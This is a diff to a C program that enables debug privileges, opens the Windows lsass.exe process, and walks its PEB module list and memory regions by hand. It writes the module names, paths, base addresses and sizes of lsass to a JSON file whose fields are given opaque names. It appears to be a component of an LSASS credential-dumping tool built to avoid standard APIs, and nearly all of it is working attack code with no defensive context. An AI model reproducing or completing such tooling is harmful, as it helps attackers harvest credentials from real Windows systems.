@@ -7,6 +7,8 @@
 #define TOKEN_QUERY 0x0008
 #define TOKEN_ADJUST_PRIVILEGES 0x0020
 #define MAX_MODULES 1024
+#define PAGE_NOACCESS 0x01
+#define MEM_COMMIT 0x00001000
 
 
 // Structs
@@ -20,6 +22,7 @@ typedef struct {
     char base_dll_name[MAX_PATH];
     char full_dll_path[MAX_PATH];
     void* dll_base;
+    int size;
 } ModuleInformation;
 
 
@@ -36,6 +39,8 @@ typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
 typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
 typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(WINAPI* NtClose_t)(HANDLE);
 
 
 // Skeletons
@@ -149,9 +154,9 @@ ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
     void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
     void* pebaddress = *(void**)peb_pointer;
 
-    printf("[+] pbi_addr: \t0x%p \n", pbi_addr);
-    printf("[+] peb pointer: \t0x%p\n", peb_pointer);
-    printf("[+] peb address: \t0x%p\n", pebaddress);
+    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
+    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
+    printf("[+] PEB Address: \t0x%p\n", pebaddress);
 
     void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
     void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
@@ -159,13 +164,14 @@ ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
     void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
     void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
 
-    printf("[+] ldr_pointer: \t0x%p\n", ldr_pointer);
-    printf("[+] ldr_adress: \t0x%p\n", ldr_adress);
-    printf("[+] next_flink: \t0x%p\n", next_flink);
+    printf("[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
+    printf("[+] Ldr Adress: \t0x%p\n", ldr_adress);
+    // printf("[+] next_flink: \t0x%p\n", next_flink);
 
     void* dll_base = (void*)1337;
     while (dll_base != NULL) {
         next_flink = (void*)((uintptr_t)next_flink - 0x10);
+        // Get DLL base address
         dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
 
         void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
@@ -179,7 +185,7 @@ ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
         ModuleInformation new_module;
         strncpy_s(new_module.base_dll_name, base_dll_name, MAX_PATH - 1);
 
-
+        // Full DLL Path
         //void* full_dll_name_addr = (char*)next_flink + flink_buffer_fulldllname_offset;
         void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
         // printf("[+] full_dll_name_addr: %p\n", full_dll_name_addr);
@@ -190,7 +196,7 @@ ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
 
         // Complete ModuleInformation         
         strncpy_s(new_module.full_dll_path, full_dll_name, MAX_PATH - 1);
-        new_module.dll_base = 0;
+        new_module.dll_base = dll_base;
         add_module(module_list, module_counter, new_module);
         module_counter++;
 
@@ -360,22 +366,144 @@ HANDLE GetProcessByName(const char* proc_name) {
 }
 
 
-int main() {
+// Function to find a module by name
+ModuleInformation find_module_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
+    for (int i = 0; i < list_size; i++) {
+        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
+            return module_list[i];  // Return a pointer to the matching module
+        }
+    }
+    // no match is found
+    ModuleInformation empty_module = { "", "", NULL, 0 };
+    return empty_module;
+}
+
+
+// Function to find a module index by name
+int find_module_index_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
+    for (int i = 0; i < list_size; i++) {
+        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
+            return i;  // Return the index of the matching module
+        }
+    }
+    return -1;  // Return -1 if no match is found
+}
+
+
+// Replace \ for \\ 
+void replace_backslash(char* str, char* result) {
+    int i, j = 0;
+    for (i = 0; str[i] != '\0'; i++) {
+        if (str[i] == '\\') {
+            result[j++] = '\\';
+            result[j++] = '\\';
+        }
+        else {
+            result[j++] = str[i];
+        }
+    }
+    result[j] = '\0';
+}
+
+
+int Shock() {
     EnableDebugPrivileges();
     HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
-    printf("[+] hProcess:\t%p\n", hProcess);
+    printf("[+] Process handle:\t%d\n", hProcess);
 
     // List to get modules information
     ModuleInformation* moduleInformationList = CustomGetModuleHandle(hProcess);
     int module_counter = 0;
+
     for (int i = 0; i < MAX_MODULES; i++) {
         if (strcmp(moduleInformationList[i].base_dll_name, "")) {
             module_counter++;
-            printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
+            //printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
         }
     }
-    printf("[+] Processed %d modules", module_counter);
+    printf("[+] Processed %d modules\n", module_counter);
 
+    // Initialize variables
+    long long proc_max_address_l = 0x7FFFFFFEFFFF;
+    PVOID mem_address = 0;
+    int aux_size = 0;
+    char aux_name[MAX_PATH] = "";
+
+    // Loop through the memory regions
+    while ((long long)mem_address < proc_max_address_l) {
+        MEMORY_BASIC_INFORMATION mbi;
+        SIZE_T returnSize;
+
+        // Populate MEMORY_BASIC_INFORMATION struct
+        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+        NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
+        NTSTATUS ntstatus = NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
+        if (ntstatus != 0) {
+            printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
+        }
+
+        // If readable and committed --> Write memory region to a file
+        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
+            // Find the module by name
+            ModuleInformation aux_module = find_module_by_name(moduleInformationList, module_counter, aux_name);
+
+            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
+                aux_module.size = aux_size;
+                // Find module index
+                int aux_index = find_module_index_by_name(moduleInformationList, module_counter, aux_name);
+                moduleInformationList[aux_index] = aux_module;
+
+                for (int k = 0; k < module_counter; k++) {
+                    if (mbi.BaseAddress == moduleInformationList[k].dll_base) {                        
+                        strcpy_s(aux_name, moduleInformationList[k].base_dll_name);
+                        aux_size = (int)mbi.RegionSize;
+                    }
+                }
+            }
+            else {
+                aux_size += (int)mbi.RegionSize;
+            }
+        }
+        // printf("%p\n", mem_address);
+        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
+    }
+
+    // Create JSON
+    char filename[] = "shock.json";
+    char json_output[256 * 400] = "[";  // Estimation
+    for (int i = 0; i < module_counter; i++) {
+        char full_dll_name_fixed[256];
+        replace_backslash(moduleInformationList[i].full_dll_path, full_dll_name_fixed);
+        
+        if (moduleInformationList[i].dll_base != 0) {
+            char json_item[256];
+            sprintf_s(json_item, sizeof(json_item),
+                "{\"field0\":\"%s\",\"field1\":\"%s\",\"field2\":\"0x%p\",\"field3\":\"%d\"}%s",
+                moduleInformationList[i].base_dll_name,
+                full_dll_name_fixed, // moduleInformationList[i].full_dll_path,
+                moduleInformationList[i].dll_base,
+                moduleInformationList[i].size,
+                (i < module_counter - 1) ? "," : "");
+            strcat_s(json_output, sizeof(json_output), json_item);
+        }
+    }
+    strcat_s(json_output, sizeof(json_output), "]");
+
+    // Write to file
+    FILE* file;
+    errno_t err = fopen_s(&file, filename, "w");
+    if (file == NULL) {
+        printf("[-] Error opening file %s\n", filename);
+        return 1;
+    }
+    fprintf(file, "%s", json_output);
+    fclose(file);
+    printf("[+] File %s generated.\n", filename);
+}
+
+
+int main() {
+    Shock();
     return 0;
 }
 
